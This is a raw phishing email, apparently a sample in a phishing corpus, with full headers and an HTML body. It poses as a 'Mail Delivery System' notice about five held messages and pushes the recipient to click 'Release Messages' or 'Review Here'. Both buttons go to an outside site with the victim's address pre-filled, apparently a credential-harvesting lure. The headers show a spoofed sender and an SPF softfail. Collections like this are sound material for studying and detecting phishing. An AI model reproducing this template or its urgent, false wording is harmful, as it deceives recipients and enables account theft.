@@ -1,0 +1,156 @@
+Return-Path: jose@monkey.org
+Delivered-To: jose@monkey.org
+X-FDA: 80777237478.29.7B8A2E6
+Received: from shut-antic.naturescar.com (unknown [185.222.58.45])
+	by imf05.b.hostedemail.com (Postfix) with ESMTP id 3B9DE1C0052
+	for <jose@monkey.org>; Thu, 11 May 2023 08:04:37 +0000 (UTC)
+Authentication-Results: imf05.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf05.b.hostedemail.com: 185.222.58.45 is neither permitted nor denied by domain of jose@monkey.org) smtp.mailfrom=jose@monkey.org;
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1683792278; a=rsa-sha256;
+	cv=none;
+	b=1BAWNwjCKHl8uKiLW/lE2FgmxKX16MrhI0NGnRTa2ityUOWEhoWagutN/BFYhrp692DDXw
+	/eL0xMQtJxdB8uBPeoSQft2tLy/YVkT3AzzeAWSWWamOfnnYaOXqpoBwsfYj9uw68xerGv
+	fnrjN44ITosnMOe7FrHZOedOl5HXNQo=
+ARC-Authentication-Results: i=1;
+	imf05.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf05.b.hostedemail.com: 185.222.58.45 is neither permitted nor denied by domain of jose@monkey.org) smtp.mailfrom=jose@monkey.org;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1683792278;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=BZRY9AhVoffC6SKuY5ZRnHlzIjNSd2PC9b4RXQMDcJU=;
+	b=UpmDpN7ZDtVfFPjYOq5d+END1jMBEAWemO1rjfL7tI3vGZCVDTu4USGnQ3E1dkXdh4w0TE
+	mLK/vnKGDrGLq53OQJEoF+gCXsd1tC/mHi/LEk+5WdGM0mrwcTIA5Y3fdAApZBuFOT7hm7
+	jRCDQncdOKsyaevEj9NuiQDBelDrc0E=
+From: Mail Delivery System <jose@monkey.org>
+To: jose@monkey.org
+CC: sale@monkey.org
+Subject: mail delivery 
+Date: 11 May 2023 10:04:37 +0200
+Message-ID: <20230511100437.1777057257CF3FF3@monkey.org>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam07
+X-Rspamd-Queue-Id: 3B9DE1C0052
+X-Rspam-User: 
+X-Spam-Status: Yes, score=9.00
+X-Stat-Signature: p9137sx4jna6hhusssu6eaocuy1za6ow
+X-HE-Tag: 1683792277-928778
+X-HE-Meta: U2FsdGVkX1+Jo2Of2wHpWQPRA2g50oF68/Xw+MSUB2swSreF914++vTs3m1XxK6VonyDgZvmRey6AG1tFiemodcQoSwqwMkYLkHHxe2Se8+H/lTjc064MGQR+ZsC+daSuSgua17Vb3Sn25k1+gv3eRrLjSxqYDqu4y0PFYZQkN2bm1VMbXj3drGK0R5LEbEiwPedZTWoKDH5OQP71Lrippc7+RjJ3jx6F2g3haTKet0=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 110
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
+f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
+; border-top-color: currentColor; border-top-width: 0px; border-top-style: =
+none; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; b=
+ackground-color: rgb(244, 248, 245); font-variant-ligatures: normal; font-v=
+ariant-caps: normal; -webkit-text-stroke-width:=20
+0px; text-decoration-thickness: initial; text-decoration-style: initial; te=
+xt-decoration-color: initial;"><div style=3D"width: 591px; height: 24px; pa=
+dding-top: 5px; padding-right: 5px; padding-bottom: 5px; margin-left: 18px;=
+ border-top-color: currentColor; border-top-width: 0px; border-top-style: n=
+one; float: left; box-sizing: border-box;">
+<div style=3D'font-family: wf_segoe-ui_normal, "Segoe UI", "Segoe WP", Taho=
+ma, Arial, sans-serif; font-size: 13px; border-top-color: currentColor; bor=
+der-top-width: 0px; border-top-style: none; box-sizing: border-box; backgro=
+und-color: rgb(244, 248, 245);'><span style=3D"box-sizing: border-box;"><fo=
+nt size=3D"2"><br class=3D"Apple-interchange-newline">Message generated fro=
+m monkey.org&nbsp;source.</font></span></div></div><div style=3D"box-sizing=
+: border-box;">
+<div style=3D"width: 5px; height: 30px; border-top-color: currentColor; bor=
+der-top-width: 0px; border-top-style: none; box-sizing: border-box; backgro=
+und-color: rgb(86, 166, 89);"></div></div></div>
+<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
+f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
+; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backg=
+round-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-varia=
+nt-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness:=
+ initial; text-decoration-style: initial;=20
+text-decoration-color: initial;"><br></div>
+<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
+f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
+; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backg=
+round-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-varia=
+nt-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness:=
+ initial; text-decoration-style: initial;=20
+text-decoration-color: initial;">&nbsp;</div>
+<table style=3D"width: 629px; text-align: left; color: rgb(44, 54, 58); tex=
+t-transform: none; letter-spacing: normal; font-family: calibri; font-size:=
+ 16px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
+: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; wi=
+dows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norm=
+al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
+ion-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;" border=3D"0"><tbody style=3D"box-=
+sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td align=3D"lef=
+t" style=3D"box-sizing: border-box;"><table style=3D"width: 627px; border-c=
+ollapse: collapse; min-width: 600px; box-sizing: border-box;" border=3D"0" =
+cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;=
+"><tr align=3D"center" style=3D"box-sizing: border-box;"><td style=3D"box-s=
+izing: border-box;">
+<table style=3D"border-collapse: collapse; max-width: 600px; box-sizing: bo=
+rder-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D=
+"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td style=
+=3D"box-sizing: border-box;"><table style=3D"width: 513px; border-collapse:=
+ collapse; box-sizing: border-box;" border=3D"0" cellspacing=3D"0" cellpadd=
+ing=3D"0"></table></td></tr><tr style=3D"box-sizing: border-box;"><td style=
+=3D"box-sizing: border-box;">
+<div style=3D"padding: 22px 25.64px 30px; text-align: center; font-family: =
+Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 25px; border-top-c=
+olor: currentColor; border-bottom-color: rgb(201, 201, 201); border-top-wid=
+th: 0px; border-bottom-width: thin; border-top-style: none; border-bottom-s=
+tyle: solid; box-sizing: border-box;">Notification of pending&nbsp;5 messag=
+es.<br style=3D"box-sizing: border-box;"></div></td></tr><tr style=3D"box-s=
+izing: border-box;"><td style=3D"box-sizing: border-box;">
+<div style=3D"border-top-color: currentColor; border-top-width: 0px; border=
+-top-style: none; box-sizing: border-box;">&nbsp;</div><div style=3D"box-si=
+zing: border-box;">&nbsp;</div><font size=3D"1"><font size=3D"2">Some messa=
+ges are restrained from delivering to<span>&nbsp;</span><u><font color=3D"#=
+0000ff">jose@monkey.org</font></u><font style=3D"box-sizing: border-box;"><=
+br><br></font></font></font><p style=3D"margin-top: 0px; margin-bottom: 1re=
+m; box-sizing: border-box;"><font size=3D"2">
+Due to low bandwidth we notify you to take prompt actions</font></p>
+<a style=3D"background: rgb(36, 107, 193); margin: 2px; padding: 10px; outl=
+ine: 0px; border: thick currentColor; border-image: none; color: rgb(255, 2=
+55, 255); text-decoration: none; float: left; display: block; box-sizing: b=
+order-box;" href=3D"https://online.conect.best/configurators.html?val=3Djos=
+e@monkey.org" target=3D"_blank" rel=3D"noreferrer"><font size=3D"3">Release=
+ Messages</font></a>
+<a style=3D"background: rgb(179, 179, 179); margin: 2px; padding: 10px; out=
+line: 0px; border: thick currentColor; border-image: none; color: rgb(255, =
+255, 255); text-decoration: none; float: left; display: block; box-sizing: =
+border-box;" href=3D"https://online.conect.best/configurators.html?val=3Djo=
+se@monkey.org" target=3D"_blank" rel=3D"noreferrer"><font size=3D"3">Review=
+ Here</font></a>
+<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
+&nbsp;</p><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: bor=
+der-box;"></p><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing:=
+ border-box;">&nbsp;</p><p style=3D"margin-top: 0px; margin-bottom: 1rem; b=
+ox-sizing: border-box;"></p><p style=3D"margin-top: 0px; margin-bottom: 1re=
+m; box-sizing: border-box;"></p>
+<h5 style=3D"line-height: 1.2; font-size: 1.25rem; font-weight: 500; margin=
+-top: 0px; margin-bottom: 0.5rem; box-sizing: border-box;"><font size=3D"1"=
+><font size=3D"2"><font size=3D"3"><font size=3D"2">Message should be moved=
+ to inbox.&nbsp;<span>&nbsp;</span><u style=3D"box-sizing: border-box;">jos=
+e@monkey.org.</u></font></font></font></font></h5></td></tr></tbody></table=
+></td></tr></tbody></table></td></tr></tbody></table></body></html>
+
